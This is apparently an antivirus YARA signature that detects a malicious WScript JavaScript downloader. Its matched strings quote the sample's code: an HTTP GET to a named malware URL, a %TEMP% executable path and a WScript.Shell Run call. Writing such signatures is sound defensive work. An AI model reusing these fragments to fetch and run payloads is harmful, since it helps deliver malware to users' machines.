rule sig_20160329_936e1cf0f27f644af867a8027c7aca81 {
  meta:
    description = "datamaliciousorder - file 20160329_936e1cf0f27f644af867a8027c7aca81.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d09a962160fe4fcd866e80cc5d9248555904c95f1682ad24132f6eb64f1e9113"

  strings:
    $s1  = "xY[m](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function le() {return k[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"a2KIDAL7OErKARjM.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[p](X() * 11); if (xY[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Sc(EH, qJ){Et = Et * 1; return EH - qJ;};" fullword ascii
    $s5  = "var k = function jD() {return WScript[G](\"WScript.Shell\");}(), sF = 11;" fullword ascii
    $s6  = "function vH(){return \"\" + bh;};" fullword ascii
    $s7  = "function wh() {return ((Ax == true) && (Ax == UU)) ? 1 : Et;};" fullword ascii
    $s8  = "function E(X0){k[\"Run\"](X0, Et, Et);};" fullword ascii
    $s9  = "function X(){return 22;};" fullword ascii
    $s10 = " while (jy){" fullword ascii
    $s11 = "return Sc(X1, pw);" fullword ascii
    $s12 = "function Wb(E0) {var V = (1, 2, 3, 4, 5, E0); return V;};" fullword ascii
    $s13 = "function y(){return G;};" fullword ascii
    $s14 = "function F()" fullword ascii
    $s15 = "var Pk = new this[\"Date\"]();" fullword ascii
    $s16 = "var UU = false;" fullword ascii
    $s17 = "var Ax = false;" fullword ascii
    $s18 = "UU = true; " fullword ascii
    $s19 = "var m0 = false;" fullword ascii
    $s20 = "Ax = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}